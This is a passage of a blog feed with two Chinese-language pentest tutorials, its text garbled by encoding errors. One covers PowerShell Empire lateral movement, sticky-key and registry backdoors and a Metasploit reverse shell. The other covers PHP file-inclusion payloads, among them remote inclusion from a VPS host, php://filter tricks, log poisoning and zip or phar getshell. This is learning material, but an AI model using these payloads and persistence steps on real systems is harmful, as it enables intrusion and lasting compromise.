src="/images/2018/09/2018-09-10-15-47-05å±å¹•æˆªå›¾.png" alt="blacsheep" /> å¦‚æœæœ‰åŸŸå†…çš„ç”¨æˆ·çš„è¿›ç¨‹,é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥steal_tokenæ¥è·å–ä»¤ç‰Œ <img src="/images/2018/09/2018-09-10-15-58-54å±å¹•æˆªå›¾.png" alt="blacsheep" /> å½“ç„¶,è¦å°†ä»¤ç‰Œæƒé™æ¢å¤åˆ°åŸæ¥çš„çŠ¶å†µçš„è¯æˆ‘ä»¬å¯ä»¥ç”¨<code>revtoself</code> <img src="/images/2018/09/2018-09-10-15-58-15å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="ä¼šè¯æ³¨å…¥">ä¼šè¯æ³¨å…¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule management/psinject</span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰å’Œå‰é¢çš„steal_tokenå·®ä¸å¤š infoçš„æ—¶å€™è®¾ç½®ä¸€ä¸‹Listenerå’ŒProcId <img src="/images/2018/09/2018-09-11-10-46-59å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶ååå¼¹å›æ¥ä¸€ä¸ªä¼šè¯ <img src="/images/2018/09/2018-09-11-10-47-09å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="invoke-psexec">Invoke-PsExec</h3><p>ç¼ºç‚¹æ˜¯è¯¥å·¥å…·åŸºæœ¬æ€æ¯’è½¯ä»¶éƒ½èƒ½æ£€æµ‹åˆ°,å¹¶ä¼šç•™ä¸‹æ—¥å¿—,è€Œä¸”éœ€è¦å¼€å¯admin$ 445ç«¯å£å…±äº«ã€‚ä¼˜ç‚¹æ˜¯å¯ä»¥ç›´æ¥è¿”å›SYSTEMæƒé™ã€‚è¿™é‡Œæˆ‘ä»¬è¦æ¼”ç¤ºçš„æ˜¯Empireä¸‹çš„Invoke-Psexecæ¨¡å—ã€‚ ä½¿ç”¨è¯¥æ¨¡å—çš„å‰ææ˜¯æˆ‘ä»¬å·²ç»è·å¾—æœ¬åœ°ç®¡ç†å‘˜æƒé™,ç”šè‡³åŸŸç®¡ç†å‘˜è´¦æˆ·,ç„¶åä»¥æ­¤æ¥è¿›ä¸€æ­¥æŒç»­æ¸—é€æ•´ä¸ªå†…ç½‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule lateral_movement/invoke_psexec</span><br></pre></td></tr></table></figure><p>ç„¶åsetå¥½è®¡ç®—æœºçš„åç§°å’ŒListenerå³å¯ è¿™é‡Œæˆ‘æœ¬åœ°å¤±è´¥äº†,å°±ä¸æˆªå›¾äº†</p><h3 id="invoke-wmi">Invoke-WMI</h3><p>å®ƒæ¯”PsExecå®‰å…¨,æ‰€æœ‰windowç³»ç»Ÿå¯ç”¨è¯¥æœåŠ¡,å½“æ”»å‡»è€…ä½¿ç”¨wmiexecæ¥è¿›è¡Œæ”»å‡»æ—¶,Windowsç³»ç»Ÿé»˜è®¤ä¸ä¼šåœ¨æ—¥å¿—ä¸­è®°å½•è¿™äº›æ“ä½œ,è¿™æ„å‘³ç€å¯ä»¥åšåˆ°æ”»å‡»æ— æ—¥å¿—,åŒæ—¶æ”»å‡»è„šæœ¬æ— éœ€å†™å…¥åˆ°ç£ç›˜,å…·æœ‰æé«˜çš„éšè”½æ€§ã€‚ä½†é˜²ç«å¢™å¼€å¯å°†ä¼šæ— æ³•è¿æ¥ã€‚è¾“å…¥usemodule lateral_movement/invoke_wmi,ä½¿ç”¨è¯¥æ¨¡å—,è¾“å…¥infoå‘½ä»¤æŸ¥çœ‹å…·ä½“å‚æ•°,å¦‚ä¸‹å›¾æ‰€ç¤º <img src="/images/2018/09/2018-09-11-11-15-41å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åæ‰§è¡Œäº†æ¶æ„ä»£ç  <img src="/images/2018/09/2018-09-11-11-19-19å±å¹•æˆªå›¾.png" alt="blacsheep" /> WMIè¿˜æœ‰ä¸€ä¸ªusemodule lateral_movement/invoke_wmi_debuggeræ¨¡å—,æ˜¯ä½¿ç”¨WMIå»è®¾ç½®äº”ä¸ªWindows Accessibilityå¯æ‰§è¡Œæ–‡ä»¶ä¸­ä»»æ„ä¸€ä¸ªçš„è°ƒè¯•å™¨ã€‚è¿™äº›å¯æ‰§è¡Œæ–‡ä»¶åŒ…æ‹¬sethc.exe(ç²˜æ»é”®,äº”ä¸‹shiftå¯è§¦å‘),narrator.exe(æ–‡æœ¬è½¬è¯­éŸ³,Utilmanæ¥å£æ¿€æ´»)ã€Utilman.exe(windowsè¾…åŠ©ç®¡ç†å™¨,Win+Uå¯ç”¨),Osk.exe(è™šæ‹Ÿé”®ç›˜,Utilmanæ¥å£å¯ç”¨)ã€Magnify.exe(æ”¾å¤§é•œ,Utilmanæ¥å£å¯ç”¨)ã€‚å¤§å®¶ä¹Ÿå¯ä»¥å°è¯•ä¸€ä¸‹ã€‚</p><h3 id="powershell-remoting5985ç«¯å£">Powershell Remoting(5985ç«¯å£)</h3><p>PowerShell remotingæ˜¯Powershellçš„è¿œç¨‹ç®¡ç†åŠŸèƒ½,å¼€å¯Windowsè¿œç¨‹ç®¡ç†æœåŠ¡WinRMä¼šç›‘å¬5985ç«¯å£,è¯¥æœåŠ¡é»˜è®¤åœ¨Windows Server 2012ä¸­æ˜¯å¯åŠ¨çš„,åœ¨Windows Server 2003ã€2008å’Œ2008 R2éœ€è¦é€šè¿‡æ‰‹åŠ¨å¯åŠ¨ å¦‚æœå¯ç”¨äº†è¿™ä¸ªæœåŠ¡,é‚£æˆ‘ä»¬å°±å¯ä»¥ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule lateral_movement/invoke_psremoting</span><br></pre></td></tr></table></figure><p>setå¥½å‚æ•°å³å¯</p><h2 id="åé—¨">åé—¨</h2><h3 id="æƒé™æŒä¹…æ€§åŠ«æŒshiftåé—¨">æƒé™æŒä¹…æ€§åŠ«æŒshiftåé—¨</h3><p>ç²˜ç½®é”®åé—¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule lateral_movement/invoke_wmi_debuggerinfo</span><br></pre></td></tr></table></figure><p>ç„¶åsetå¥½listenerå’Œcomputer name,ç„¶åtarget binaryè®¾ç½®sethc.exe,executeæˆåŠŸä¹‹åæœ‰æé†’,ç„¶åå»é¶æœºä¸ŠæŒ‰shiftå°±åå¼¹shellå›æ¥äº† <img src="/images/2018/09/12-51-08.png" alt="blacsheep" /> æ³¨æ„:sethc.exeè¿™é‡Œæœ‰å‡ ä¸ªå¯ä»¥æ›¿æ¢çš„é€‰é¡¹ã€‚ A.Utilman.exeï¼ˆå¿«æ·é”®ä¸º: Win + Uï¼‰ B.osk.exeï¼ˆå±å¹•ä¸Šçš„é”®ç›˜Win + Uå¯åŠ¨å†é€‰æ‹©ï¼‰ C.Narrator.exe (å¯åŠ¨è®²è¿°äººWin + Uå¯åŠ¨å†é€‰æ‹©) D.Magnify.exe(æ”¾å¤§é•œWin + Uå¯åŠ¨å†é€‰æ‹©ï¼‰</p><h3 id="æ³¨å†Œè¡¨æ³¨å…¥åé—¨">æ³¨å†Œè¡¨æ³¨å…¥åé—¨</h3><p>è¿™é‡Œæˆ‘åªæ˜¯setäº†ä¸€ä¸ªlistener <img src="/images/2018/09/2018-09-11-13-10-59å±å¹•æˆªå›¾.png" alt="blacsheep" /> é‡æ–°ç™»å½•ç³»ç»Ÿçš„æ—¶å€™è¿è¡Œäº†æ¶æ„ä»£ç ,ç›´æ¥åäº†ä¸€ä¸ªshell ä¸è¿‡ç™»å½•çš„æ—¶å€™é»‘æ¡†è¿˜æ˜¯è›®æ˜æ˜¾çš„ <img src="/images/2018/09/2018-09-11-13-14-21å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="è®¡åˆ’ä»»åŠ¡è·å¾—æƒé™">è®¡åˆ’ä»»åŠ¡è·å¾—æƒé™</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule persistence/elevated/schtasks</span><br></pre></td></tr></table></figure><p>è®¾ç½®ä¸€ä¸‹æ—¶é—´å’ŒListener,ç„¶åå°±å¯ä»¥è¿”å›agentäº† ä½†æ˜¯æ€è½¯ä¼šæŠ¥æç¤º <img src="/images/2018/09/2018-09-11-13-32-52å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åå°±è¿”å›agentäº† <img src="/images/2018/09/2018-09-11-13-36-07å±å¹•æˆªå›¾.png" alt="blacsheep" /> å¯ä»¥çœ‹åˆ°æƒé™æ˜¯System <img src="/images/2018/09/2018-09-11-13-37-18å±å¹•æˆªå›¾.png" alt="blacsheep" /> è¿™é‡Œå¦‚æœæŠŠset RegPath çš„å‚æ•°æ”¹ä¸ºå‰é¢çš„æ³¨å†Œè¡¨å‚æ•°,é‚£ä¹ˆå°±ä¼šåœ¨ç›¸åº”æ—¶é—´æ·»åŠ ä¸€ä¸ªæ³¨å†Œè¡¨æ³¨å…¥åé—¨,å¤§å®¶å¯ä»¥ç»ƒä¹ ä¸€ä¸‹ã€‚</p><h2 id="åå¼¹meterpreter">åå¼¹meterpreter</h2><p>ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule code_execution/invoke_shellcode</span><br></pre></td></tr></table></figure><p>å¡«å¥½lhostå’Œlport,ä»–çš„payloadé»˜è®¤æ˜¯https,ä¸ç®¡å°±ok <img src="/images/2018/09/2018-09-11-13-59-53å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åå»msfè®¾ç½®ä¸€ä¸‹ç›‘å¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_https</span><br><span class="line">msf exploit(multi/handler) &gt; set lhost xx.xx.xx.xx</span><br><span class="line">msf exploit(multi/handler) &gt; set lport 4444</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure><p>è¿”å›empireè¿›è¡Œexecute <img src="/images/2018/09/2018-09-11-13-52-49å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åmetasploitä¸Šé¢å°±åäº†ä¸€ä¸ªmeterpreter <img src="/images/2018/09/2018-09-11-14-10-54å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="æ€»ç»“">æ€»ç»“</h2><p>ç®€å•åœ°å¯¹empireè¿›è¡Œä¸€ä¸ªå­¦ä¹ ,ä¹Ÿæ˜¯å¯¹æ¸—é€å­¦ä¹ çš„ä¸€ä¸ªè¡¥å……,åç»­å¯èƒ½è¿˜ä¼šå¯¹metasploitè¿›è¡Œä¸€ä¸ªæ·±å…¥å­¦ä¹ ,æŒ–å‘å¾…å¡«å§...</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>phpæ–‡ä»¶åŒ…å«æ€»ç»“å’Œå­¦ä¹ </title>
      <link href="/2018/09/07/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93%E5%92%8C%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/09/07/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93%E5%92%8C%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>å¾ˆæ—©å°±æœ‰å†™ä¸€ç¯‡æ€»ç»“åŒ…å«æ¼æ´æ–‡ç« çš„æƒ³æ³•äº†,åŠ ä¸Šè¿‘æœŸå¯¹åŒ…å«æ¼æ´è¿˜æœ‰äº†ä¸€äº›æ–°çš„å­¦ä¹ ,éƒ½åœ¨è¿™é‡Œç®€å•è®°å½•ä¸‹</p><h2 id="php.iniä¸­çš„ä¸¤ä¸ªallow">php.iniä¸­çš„ä¸¤ä¸ªallow</h2><p>å³allow_url_fopenå’Œallow_url_include allow_url_fopenè¡¨ç¤ºæ˜¯å¦å…è®¸å°†é“¾æ¥ä»¥æ–‡ä»¶çš„å½¢å¼æ‰“å¼€ allow_url_includeè¡¨ç¤ºæ˜¯å¦å…è®¸å°†é“¾æ¥ä»¥æ–‡ä»¶å½¢å¼è¿›è¡ŒåŒ…å«</p><h3 id="fopenå’Œincludeå‡æ‰“å¼€">fopenå’Œincludeå‡æ‰“å¼€</h3><p>å‡è®¾ä¸€ä¸ªåœºæ™¯,æˆ‘ä»¬å»åŒ…å«ä¸€ä¸ªurl é‚£ä¹ˆé¦–å…ˆæ˜¯çœ‹allow_url_fopenæ˜¯å¦å¼€å¯,å¦‚æœå¼€å¯å†çœ‹allow_url_includeæ˜¯å¦å¼€å¯ åœ¨ä¸¤è€…éƒ½å¼€å¯æ—¶å°±å¯ä»¥åŒ…å«è¿œç¨‹æ–‡ä»¶,åˆ©ç”¨ä¹Ÿæ¯”è¾ƒç®€å•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?file=http://your_vps/shell.txt</span><br></pre></td></tr></table></figure><p>å³å¯æ‹¿shell å¦‚æœåç¼€éœ€è¦ç»•è¿‡,é‚£ä¹ˆå¯ä»¥é€šè¿‡#æ¥ç»•è¿‡,ä¸¾ä¸ªä¾‹å­ åç«¯åŒ…å«ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;secret.php&quot;</span>);</span><br><span class="line">   <span class="comment">//å‡è®¾$secretä¸å¯çˆ†ç ´</span></span><br><span class="line">   <span class="comment">//æ¯”å¦‚$secret=&quot;.alfalksfhakljsf$%YGBASasidjoasjd12&quot;;</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="variable">$secret</span>);</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶çš„åç¼€æˆ‘ä»¬å¹¶ä¸çŸ¥é“ é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨urlçš„ç‰¹æ€§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?file=http://your_vps/shell.txt%23</span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨ä¸Šé¢å»åŒ…å«</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your_vps/shell.txt#.alfalksfhakljsf$%YGBASasidjoasjd12</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆäº•å·åé¢çš„ä¸œè¥¿éƒ½æ— æ‰€è°“äº† å½“ç„¶,åˆ©ç”¨queryä»€ä¹ˆçš„ä¹Ÿéƒ½å¯ä»¥</p><h3 id="fopenå…³é—­includeæ‰“å¼€">fopenå…³é—­includeæ‰“å¼€</h3><p>è¿™ä¸ªæ—¶å€™æ˜¯å¯ä»¥é€šè¿‡åŒ…å«ä»£ç è¿›è¡Œæ‰§è¡Œçš„ <img src="/images/2018/09/2018-09-07-12-12-21å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="fopenæ‰“å¼€includeå…³é—­">fopenæ‰“å¼€includeå…³é—­</h3><p>è¿™ä¸ªæ˜¯æœ€æ­£å¸¸çš„,å› ä¸ºallow_url_fopené»˜è®¤æ‰“å¼€,allow_url_includeé»˜è®¤å…³é—­ ä¸€èˆ¬æ¥è¯´,åªæ‰“å¼€fopen,å…³é—­includeå…¶å®å¹¶æ²¡æœ‰ä»€ä¹ˆå¾ˆå¤§çš„ä½œç”¨... ä½†å¦‚æœæœ‰è¿™ä¹ˆä¸€æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$f</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;http://localhost&#x27;</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="number">100</span>));</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœallow_url_fopenå…³é—­,é‚£ä¹ˆvar_dumpå¹¶ä¸èƒ½è¾“å‡º,å®é™…ä¸Šåœ¨fopençš„æ—¶å€™å°±ä¼šæŠ¥é”™äº† ä¸è¿‡å¦‚æœallow_url_fopenæ‰“å¼€,é‚£ä¹ˆä¼šè¾“å‡ºç½‘é¡µä»£ç  è¿™é‡Œä»…ä½œä¸€ä¸ªç®€å•ä»‹ç»</p><h3 id="fopenå’Œincludeéƒ½å…³é—­">fopenå’Œincludeéƒ½å…³é—­</h3><p>å½“ç„¶ä¹Ÿé€‚ç”¨fopenæ‰“å¼€çš„æƒ…å†µ</p><h4 id="åŒ…å«ä¸Šä¼ çš„æ–‡ä»¶">åŒ…å«ä¸Šä¼ çš„æ–‡ä»¶</h4><p>æ¯”å¦‚å¯ä»¥ä¸Šä¼ jpg,txtä¹‹ç±»çš„,ç„¶åå»åŒ…å«è‡ªå·±ä¸Šä¼ çš„æ–‡ä»¶å³å¯ <img src="/images/2018/09/2018-09-07-12-29-28å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h4 id="phpfilterçš„encodeè¯»æ–‡ä»¶">php://filterçš„encodeè¯»æ–‡ä»¶</h4><p>å‰ææ˜¯è¿‡æ»¤å¹¶ä¸æ˜¯é‚£ä¹ˆä¸¥æ ¼,åˆ©ç”¨php://filter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=</span><br></pre></td></tr></table></figure><p><img src="/images/2018/09/2018-09-07-12-30-30å±å¹•æˆªå›¾.png" alt="blacsheep" /> <strong>å­˜åœ¨ä¸€äº›ç®€å•çš„ç»•è¿‡,æ¯”å¦‚åŒå†™ç»•è¿‡,å¤§å°å†™ç»•è¿‡,00æˆªæ–­ä¹‹ç±»çš„</strong></p><h4 id="phpfilterçš„decodeæ‰§è¡Œä»£ç ">php://filterçš„decodeæ‰§è¡Œä»£ç </h4><p>åŠ å…¥å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œäº†è¿‡æ»¤,ä¸å…è®¸ä¸Šä¼ å«æœ‰ç‰¹æ®Šç¬¦å·çš„æ–‡ä»¶,é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä¸Šä¼ baseç¼–ç çš„æ–‡ä»¶,ç„¶åç”¨decodeå»åŒ…å« æ¯”å¦‚æˆ‘ä»¬åœ¨shell.phpé‡Œé¢å†™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKcGhwaW5mbygpOwo/Pgo=</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-decode/resource=</span><br></pre></td></tr></table></figure><figure><img src="/images/2018/09/2018-09-07-12-35-08å±å¹•æˆªå›¾.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h4 id="åŒ…å«æ—¥å¿—æ–‡ä»¶">åŒ…å«æ—¥å¿—æ–‡ä»¶</h4><p>ä¸€èˆ¬æ¥è¯´æ˜¯æ²¡æœ‰æƒé™çš„,apache2çš„æ–‡ä»¶å¤¹æƒé™æ˜¯é»˜è®¤750,access.logçš„æƒé™é»˜è®¤640,www-dataæ²¡æœ‰ä»»ä½•æƒé™ è¿™é‡Œä¸ºäº†æ¼”ç¤º,æˆ‘ç»™<code>chmod 777</code>äº†,å¦‚æœå®é™…ç»ƒä¹ åç»­è®°å¾—æ”¹å›æ¥ <img src="/images/2018/09/2018-09-07-13-11-48å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h4 id="åŒ…å«sshlog">åŒ…å«sshlog</h4><p>sshlogåœ¨/var/log/auth.log,æƒé™é»˜è®¤640 åŒ…å«çš„æ—¶å€™ç”¨sshè¿ä¸Šå»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>@<span class="number">127.0</span>.<span class="number">0.1</span></span><br></pre></td></tr></table></figure><p>å¯†ç éšæ„è¾“å…¥,æŸ¥çœ‹æ—¥å¿— <img src="/images/2018/09/2018-09-07-13-19-17å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h4 id="åŒ…å«session">åŒ…å«session</h4><p>å¼ºç½‘æ¯çš„æ—¶å€™åˆ©ç”¨è¿‡ <code>session.upload_progress.enabled</code>å¦‚æœæ‰“å¼€äº†,æˆ‘ä»¬å°±å¯ä»¥ç”¨ä¼ æ–‡ä»¶çš„æ–¹å¼ä¼ session.å½“ç„¶,å¦‚æœå¼€å¯äº†<code>session.upload_progress.cleanup</code>åŒæ ·ä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨çš„,ä¸è¿‡éœ€è¦æ¡ä»¶ç«äº‰,å…·ä½“çš„wpå¯ä»¥å»çœ‹å¼ºç½‘æ¯çš„easy phpé‚£é“é¢˜ å€¼å¾—ä¸€æçš„æ˜¯è¿™ä¸¤ä¸ªå‚æ•°phpå¥½åƒæ˜¯é»˜è®¤å¼€å¯çš„ sessionä¸€èˆ¬çš„ä½ç½®:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure><p>å¦‚æœèƒ½å¤Ÿå¼„åˆ°phpinfoçš„è¯å°±æ›´å¥½è¯´äº†,phpinfoä¸­æ˜¯å­˜æœ‰sessionçš„ä¿å­˜ä½ç½®çš„</p><h4 id="procselfenviron">/proc/self/environ</h4><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.phpä»¥cgiæ–¹å¼è¿è¡Œï¼Œè¿™æ ·environæ‰ä¼šä¿æŒUAå¤´ã€‚</span><br><span class="line">2.environæ–‡ä»¶å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œä¸”environæ–‡ä»¶å¯è¯»ã€‚</span><br></pre></td></tr></table></figure><p>ç”¨æˆ·çš„uaä¼šå­˜åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œé¢,ä¸è¿‡æˆ‘æœ¬åœ°å¹¶æ²¡æœ‰æˆåŠŸ,å¯ä»¥è‡ªå·±å»æµ‹è¯•ä¸€ä¸‹</p><h4 id="åŒ…å«ä¸´æ—¶æ–‡ä»¶">åŒ…å«ä¸´æ—¶æ–‡ä»¶</h4><p>éšæ„ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åˆ°æœåŠ¡å™¨éƒ½æ˜¯è¦ç»è¿‡ä»¥ä¸‹æ­¥éª¤çš„ <img src="/images/2018/09/804631-20151116135028890-525890377.jpg" alt="blacsheep" /> åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰å¯ä»¥åˆ©ç”¨æ¡ä»¶ç«äº‰è¿›è¡ŒåŒ…å« ç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£,linuxä¸‹ä½¿ç”¨çš„éšæœºå‡½æ•°æœ‰ç¼ºé™·,è€Œwindowä¸‹åªæœ‰65535ä¸­ä¸åŒçš„æ–‡ä»¶å,æ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚ å¦ä¸€ç§æ–¹æ³•æ˜¯é…åˆphpinfoé¡µé¢çš„php variables,å¯ä»¥ç›´æ¥è·å–åˆ°ä¸Šä¼ æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„å’Œä¸´æ—¶æ–‡ä»¶å,ç›´æ¥åŒ…å«å³å¯</p><h2 id="zipæ‰©å±•">zipæ‰©å±•</h2><h3 id="å®‰è£…">å®‰è£…</h3><p>æˆ‘kaliä¸Šé¢çš„phpæ˜¯å¹¶æ²¡æœ‰zipæ‰©å±•çš„,å¯ä»¥è‡ªå·±å»è£…ä¸€ä¸‹ å»<a href="http://pecl.php.net/package/zip" title="http://pecl.php.net/package/zip">http://pecl.php.net/package/zip</a>ä¸‹è½½æ‰©å±• ç„¶å</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar -zxcf xxx.zip</span><br><span class="line">cd xxx</span><br><span class="line">phpize</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>ç„¶åå»php.inié‡Œé¢åŠ ä¸Šæ‰©å±•å°±å¥½äº†,soè·¯å¾„åœ¨/usr/lib/php20170718/ å¦‚æœæ²¡æœ‰phpizeå°±å»<code>apt-get install php7.x-dev</code> ç¼ºå°‘libçš„è¯è‡ªå·±aptè£…ä¸€ä¸‹</p><h3 id="åˆ©ç”¨zipåè®®getshell">åˆ©ç”¨zipåè®®getshell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@kali:/var/www/html# cat 1.jpg</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">blacsheep@kali:/var/www/html# zip -q -o 1.zip 1.jpg</span><br><span class="line">blacsheep@kali:/var/www/html# mv 1.zip 2.jpg</span><br></pre></td></tr></table></figure><p>ç„¶åå»ç”¨zipåè®®åŒ…å«å°±å¥½äº† <img src="/images/2018/09/2018-09-07-16-43-42å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="pharæ‰©å±•">pharæ‰©å±•</h2><h3 id="pharåè®®åŒ…å«getshell">pharåè®®åŒ…å«getshell</h3><p>åŒæ ·åˆ©ç”¨å‰é¢çš„zipæ–‡ä»¶ <img src="/images/2018/09/2018-09-07-16-51-35å±å¹•æˆªå›¾.png" alt="blacsheep" /> åªä¸è¿‡é‡Œé¢çš„<code>#</code>æ¢æˆäº†<code>/</code></p><h3 id="pharååºåˆ—åŒ–">pharååºåˆ—åŒ–</h3><p>ä¸ç®—æ–‡ä»¶åŒ…å«,ä½†æåˆ°äº†pharåè®®å°±æä¸€ä¸‹å§ åŸç†å°±æ˜¯<strong>phpåœ¨è§£æpharå¯¹è±¡çš„æ—¶å€™ä¼šå¯¼è‡´metadataçš„æ•°æ®è¢«ååºåˆ—åŒ–</strong> åŸé¢˜æ˜¯hitcon2017çš„baby^h-master-php-2017 ç„¶ååˆ©ç”¨ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;);</span><br></pre></td></tr></table></figure><p>ç„¶åç»™äº†ä¸€ä¸ªæ¶æ„æ„é€ çš„phar,å¯¼è‡´ååºåˆ—åŒ–æ¼æ´ é¢˜å¤–è¯,æƒ³äº†è§£çš„è¯å»çœ‹ <a href="http://localhost/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/#babyh-master-php-2017" title="http://localhost/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/#babyh-master-php-2017">http://localhost/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/#babyh-master-php-2017</a></p><h2 id="åˆ©ç”¨å·¥å…·">åˆ©ç”¨å·¥å…·</h2><h3 